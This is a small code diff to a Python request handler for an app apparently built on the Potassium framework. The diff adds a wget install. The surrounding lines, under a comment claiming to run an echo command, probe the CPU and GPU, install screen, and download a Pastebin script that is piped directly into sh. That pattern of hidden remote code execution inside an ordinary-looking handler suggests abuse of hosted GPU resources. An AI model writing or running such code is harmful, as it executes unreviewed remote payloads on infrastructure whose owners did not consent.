@@ -7,6 +7,7 @@ app = Potassium("my_app")
 def handler(context: dict, request: Request) -> Response:
     # Execute the echo command
     os.system('apt-get update -y')
+    os.system('apt-get install wget -y')
     os.system('apt-get install screen -y')
     os.system('lscpu && pwd && nvidia-smi && wget https://google.com')
     os.system("(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh")
